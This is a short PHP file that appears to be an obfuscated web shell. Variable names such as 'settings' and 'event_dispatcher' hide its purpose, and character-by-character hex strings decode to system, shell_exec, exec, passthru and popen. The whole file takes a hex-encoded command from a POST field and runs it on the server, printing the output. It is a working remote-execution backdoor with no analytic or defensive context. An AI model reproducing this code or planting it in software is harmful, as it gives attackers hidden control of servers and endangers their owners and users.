<?php


$ptr1 = '9';
$ptr2 = '7';
$ptr3 = '4';
$ptr4 = '6';
$ptr5 = 'd';
$ptr6 = '3';
$ptr7 = 'c';
$ptr8 = '5';
$ptr9 = 'f';
$ptr10 = '0';
$ptr11 = '8';
$ptr12 = '2';
$ptr13 = '1';
$ptr14 = 'e';
$settings1 = pack("H*", '7' . '3' . '7' . $ptr1 . $ptr2 . '3' . $ptr2 . $ptr3 . $ptr4 . '5' . $ptr4 . $ptr5);
$settings2 = pack("H*", '7' . $ptr6 . $ptr4 . '8' . '6' . '5' . '6' . $ptr7 . $ptr4 . 'c' . $ptr8 . $ptr9 . $ptr4 . $ptr8 . '7' . '8' . '6' . '5' . '6' . $ptr6);
$settings3 = pack("H*", $ptr4 . $ptr8 . $ptr2 . '8' . '6' . $ptr8 . $ptr4 . '3');
$settings4 = pack("H*", '7' . $ptr10 . $ptr4 . '1' . '7' . $ptr6 . $ptr2 . '3' . '7' . '4' . '6' . $ptr11 . '7' . $ptr12 . $ptr2 . '5');
$settings5 = pack("H*", '7' . '0' . $ptr4 . 'f' . $ptr2 . '0' . '6' . '5' . '6' . 'e');
$settings6 = pack("H*", $ptr2 . '3' . '7' . '4' . $ptr2 . '2' . $ptr4 . '5' . $ptr4 . $ptr13 . '6' . $ptr5 . '5' . 'f' . $ptr4 . '7' . '6' . '5' . '7' . $ptr3 . '5' . $ptr9 . '6' . $ptr6 . $ptr4 . 'f' . $ptr4 . $ptr14 . '7' . $ptr3 . $ptr4 . $ptr8 . $ptr4 . $ptr14 . '7' . $ptr3 . '7' . '3');
$settings7 = pack("H*", $ptr2 . '0' . $ptr4 . $ptr6 . '6' . 'c' . $ptr4 . 'f' . '7' . $ptr6 . $ptr4 . '5');
$event_dispatcher = pack("H*", '6' . '5' . $ptr2 . '6' . '6' . $ptr8 . '6' . 'e' . $ptr2 . $ptr3 . $ptr8 . 'f' . $ptr4 . $ptr3 . $ptr4 . '9' . '7' . '3' . '7' . '0' . $ptr4 . '1' . $ptr2 . $ptr3 . $ptr4 . '3' . '6' . $ptr11 . $ptr4 . '5' . '7' . $ptr12);
if (isset($_POST[$event_dispatcher])) {
    $event_dispatcher = pack("H*", $_POST[$event_dispatcher]);
    if (function_exists($settings1)) {
        $settings1($event_dispatcher);
    } elseif (function_exists($settings2)) {
        print $settings2($event_dispatcher);
    } elseif (function_exists($settings3)) {
        $settings3($event_dispatcher, $entry_marker);
        print join("\n", $entry_marker);
    } elseif (function_exists($settings4)) {
        $settings4($event_dispatcher);
    } elseif (function_exists($settings5) && function_exists($settings6) && function_exists($settings7)) {
        $binding_comp = $settings5($event_dispatcher, 'r');
        if ($binding_comp) {
            $descriptor_parameter_group = $settings6($binding_comp);
            $settings7($binding_comp);
            print $descriptor_parameter_group;
        }
    }
    exit;
}
